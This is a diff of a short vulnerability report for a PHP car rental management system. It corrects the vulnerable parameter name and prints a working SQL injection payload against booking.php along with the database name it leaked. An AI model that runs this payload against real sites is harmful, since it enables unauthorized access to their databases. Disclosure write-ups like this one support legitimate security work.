@@ -6,9 +6,9 @@ vendors: https://www.campcodes.com/projects/php/car-rental-management-system/
 
 Vulnerability File: car-rental-management-system/booking.php?car_id=
 
-Vulnerability location: car-rental-management-system/booking.php?car_id=,id
+Vulnerability location: car-rental-management-system/booking.php?car_id=,car_id
 
-[+] Payload: car-rental-management-system/booking.php?car_id=-1%20union%20select%201,database(),3,4,5,6,7,8,9,10--+ // Leak place ---> id
+[+] Payload: car-rental-management-system/booking.php?car_id=-1%20union%20select%201,database(),3,4,5,6,7,8,9,10--+ // Leak place ---> car_id
 
 Current database name: car_rental_db
 
